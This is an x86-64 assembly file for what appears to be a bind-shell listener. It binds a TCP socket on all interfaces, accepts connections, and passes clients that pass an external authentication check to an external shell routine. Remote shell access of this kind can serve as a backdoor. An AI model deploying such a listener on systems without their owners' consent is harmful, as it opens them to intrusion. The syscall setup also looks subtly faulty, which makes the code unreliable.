BITS 64

section .text
    global  create_server
    global  loop_server
    extern  shell_mode
    extern  auth
    global client_fd
    global sock_fd
    global serv
    global family
    global port
    global addr
    global zero
    global servlen
    global client
    global cfamily
    global cport
    global caddr
    global czero
    global clen
    global create_server

create_server: ; (rdi = htons(port))
    push    rbp
    mov     rbp, rsp
    push    rdi
    xor     edx, edx ; IP
    xor     edi, edi
    xor     esi, esi
    add     edi, 2 ; AF_INET
    add     esi, 1 ; SOCK_STREAM
    add     eax, 0x29 ; socket
    syscall
    mov     [sock_fd], eax
    mov     edi, eax
    xor     esi, esi
    xor     edx, edx
    add     esi, 1
    add     edx, 2 ; SO_REUSEADDRESS
    push    1
    lea     r10, [rsp]
    xor     r8, r8
    add     r8, 4
    xor     eax, eax
    add     eax, 0x36 ; setsockopt
    syscall
    mov     [family], WORD 2 ; AF_INET
    mov     rdi, [rsp + 0x8]
    mov     [port], edi
    mov     DWORD [addr], 0 ; htonl(INADDR_ANY)
    mov     edi, [sock_fd]
    lea     rsi, [rel serv]
    mov     rdx, servlen
    xor     eax, eax
    add     eax, 0x31 ; bind
    syscall
    mov     edi, DWORD [sock_fd]
    xor     eax, eax
    xor     esi, esi
    mov     esi, 1
    add     eax, 0x32 ; listen
    syscall
    leave
    ret

loop_server:
    mov     edi, DWORD [sock_fd]
    lea     rsi, [rel client]
    lea     rdx, [rel clen]
    xor     eax, eax
    add     eax, 0x2b ; accept
    syscall
    mov     [client_fd], DWORD eax
    mov     edi, [client_fd]
    call    auth
    cmp     rax, 0
    jne     bye
    mov     edi, [client_fd]
    call    shell_mode
bye:
    mov     edi, [client_fd]
    xor     eax, eax
    add     eax, 0x03 ; close
    syscall
    jmp     loop_server
    ret

    client_fd   dd 0
    sock_fd     dd 0
    serv:
        family      dw 0
        port        dw 0
        addr        dd 0
        zero        dq 0
        servlen     equ $ - serv
    client:
        cfamily      dw 0
        cport        dw 0
        caddr        dd 0
        czero        dq 0
        clen         dd 0 
